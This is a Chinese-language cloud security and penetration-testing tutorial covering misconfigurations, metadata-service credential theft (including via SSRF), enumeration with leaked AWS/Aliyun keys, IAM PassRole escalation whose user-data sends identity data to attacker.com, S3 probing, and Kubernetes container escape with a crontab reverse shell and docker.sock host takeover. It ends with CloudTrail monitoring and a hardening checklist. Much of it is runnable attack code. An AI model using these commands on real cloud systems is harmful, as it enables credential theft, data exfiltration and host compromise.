# 云安全架构与渗透测试实战

> 📅 2026-06-12 | 🎯 精通 | ⏱ 25 min | 分类：云安全

## 📋 提纲

1. 云安全责任共担模型
2. 云渗透测试要点
3. IAM权限提升
4. 云存储安全(S3/OSS)
5. 容器与K8s安全
6. 云日志与监控

---

## 1. 云安全责任共担

```
SaaS: 云厂商负责一切（除了用户数据分类和使用）
PaaS: 云厂商负责底层，用户负责应用/数据/身份
IaaS: 云厂商负责物理/网络/虚拟化，用户负责OS以上的全部

云安全 = 厂商安全 × 用户配置安全
           (99.9%)      (最大的风险源)
```

### 1.1 常见云安全配置错误

```
1. S3/OSS Bucket 公开访问（数据泄露第一杀手）
2. 安全组 0.0.0.0/0 开放（SSH/RDP/Redis/ES）
3. IAM 权限过大（*:* 或 AdministratorAccess）
4. AK/SK 硬编码在前端代码/GitHub
5. 元数据服务未限制访问（IMDSv1）
6. 数据库公开访问+无密码
7. K8s API Server 暴露公网
```

---

## 2. 云渗透测试要点

### 2.1 元数据服务利用

```bash
# AWS EC2 元数据（IMDSv1）
curl http://169.254.169.254/latest/meta-data/
curl http://169.254.169.254/latest/meta-data/iam/security-credentials/
curl http://169.254.169.254/latest/meta-data/iam/security-credentials/role-name
# → 返回 AccessKeyId, SecretAccessKey, Token

# 阿里云 ECS 元数据
curl http://100.100.100.200/latest/meta-data/
curl http://100.100.100.200/latest/meta-data/ram/security-credentials/role-name

# 腾讯云 CVM 元数据
curl http://metadata.tencentyun.com/latest/meta-data/

# 通过SSRF访问元数据（攻击方式）
# 如果Web应用存在SSRF：
?url=http://169.254.169.254/latest/meta-data/iam/security-credentials/
```

### 2.2 AK/SK 泄露利用

```python
#!/usr/bin/env python3
"""云凭证泄露后利用"""

# AWS
import boto3

def aws_enum(access_key, secret_key, token=None):
    """AWS 凭证泄露后信息收集"""
    session = boto3.Session(
        aws_access_key_id=access_key,
        aws_secret_access_key=secret_key,
        aws_session_token=token
    )

    # 检查凭证是否有效
    sts = session.client('sts')
    identity = sts.get_caller_identity()
    print(f"[+] 身份: {identity['Arn']}")

    # 枚举EC2
    ec2 = session.client('ec2')
    instances = ec2.describe_instances()
    for r in instances['Reservations']:
        for i in r['Instances']:
            print(f"  EC2: {i['InstanceId']} {i.get('PublicIpAddress','')} {i['State']['Name']}")

    # 枚举S3 Bucket
    s3 = session.client('s3')
    buckets = s3.list_buckets()
    for b in buckets['Buckets']:
        print(f"  S3: {b['Name']}")

        # 尝试列目录
        try:
            objects = s3.list_objects_v2(Bucket=b['Name'], MaxKeys=10)
            for obj in objects.get('Contents', []):
                print(f"    - {obj['Key']} ({obj['Size']} bytes)")
        except:
            print(f"    - 无法列出 (可能公开)")

    # 枚举IAM用户/角色
    iam = session.client('iam')
    users = iam.list_users()
    for u in users['Users']:
        print(f"  IAM User: {u['UserName']}")

# 阿里云
def aliyun_enum(access_key, secret_key):
    from aliyunsdkcore.client import AcsClient
    from aliyunsdkecs.request.v20140526 import DescribeInstancesRequest
    from aliyunsdkram.request.v20150501 import ListUsersRequest

    client = AcsClient(access_key, secret_key, 'cn-hangzhou')

    # 枚举ECS
    request = DescribeInstancesRequest.DescribeInstancesRequest()
    response = client.do_action_with_exception(request)
    print(response)
```

---

## 3. IAM权限提升

```bash
# 1. 列出当前用户的所有权限
aws iam list-attached-user-policies --user-name CurrentUser
aws iam list-user-policies --user-name CurrentUser
aws iam list-groups-for-user --user-name CurrentUser

# 2. 查找可提权的策略
# 如果策略包含 iam:Put* → 可以修改自己权限
# 如果策略包含 iam:Create* → 可以创建高权限用户
# 如果策略包含 lambda:UpdateFunctionCode → 可以修改Lambda函数代码获取执行角色权限
# 如果策略包含 ec2:RunInstances+iam:PassRole → 可以创建EC2并传递高权限角色

# 3. 利用 PassRole 创建高权限EC2
aws ec2 run-instances \
    --image-id ami-xxx \
    --instance-type t2.micro \
    --iam-instance-profile Name="AdminRole" \
    --user-data "#!/bin/bash\ncurl http://attacker.com/$(aws sts get-caller-identity)"
# EC2启动后，通过元数据可以获取AdminRole的AK/SK
```

---

## 4. S3/OSS 存储安全

```bash
# AWS S3 公开检测
aws s3 ls s3://bucket-name --no-sign-request

# 或直接HTTP访问
curl http://bucket-name.s3.amazonaws.com/
curl https://s3.amazonaws.com/bucket-name/

# 阿里云OSS
curl http://bucket-name.oss-cn-hangzhou.aliyuncs.com/

# 常见敏感文件
for key in backup/ database.zip credentials.txt .env config.yml \
    wp-config.php.bak users.csv; do
    curl -s "https://bucket-name.s3.amazonaws.com/$key" | head -20
done
```

---

## 5. 容器与K8s安全

```bash
# K8s API Server 未授权访问
kubectl --server=https://target.com:6443 --insecure-skip-tls-verify get pods

# 如果拿到了一个Pod的Shell → 容器逃逸
# 1. 检查是否是特权容器
cat /proc/self/status | grep -i "cap"
# CapEff: 0000003fffffffff → 特权容器！

# 2. 挂载宿主机根目录（特权容器）
mount /dev/sda1 /mnt
ls /mnt/etc/

# 3. 写入crontab反弹Shell
echo "* * * * * /bin/bash -c 'bash -i >& /dev/tcp/10.0.0.1/4444 0>&1'" > /mnt/etc/crontab

# 4. 如果挂载了docker.sock → 完整宿主机控制
docker -H unix:///host/var/run/docker.sock run -it --privileged --pid=host alpine nsenter -t 1 -m -u -n -i sh
```

---

## 6. 云日志与监控

```bash
# AWS CloudTrail - 审计日志
aws cloudtrail lookup-events --lookup-attributes AttributeKey=EventName,AttributeValue=ConsoleLogin

# 检测异常活动
# 1. 来自异常地域的API调用
# 2. 非工作时间的操作
# 3. 新IAM用户创建
# 4. 安全组规则修改(0.0.0.0/0)
# 5. S3 Bucket策略修改为公开
```

---

## ✅ 云安全 Checklist

- [ ] S3/OSS Bucket 公开访问检测
- [ ] 安全组 0.0.0.0/0 规则审计
- [ ] IAM 权限最小化检查
- [ ] AK/SK 是否硬编码扫描
- [ ] 元数据服务 IMDSv2 强制
- [ ] CloudTrail/操作审计 启用
- [ ] K8s RBAC 审计
- [ ] 容器特权模式禁用

> 📚 延伸阅读：Penetration/001-Web流程 | HW/002-资产自查 | SOC/001-SOC建设
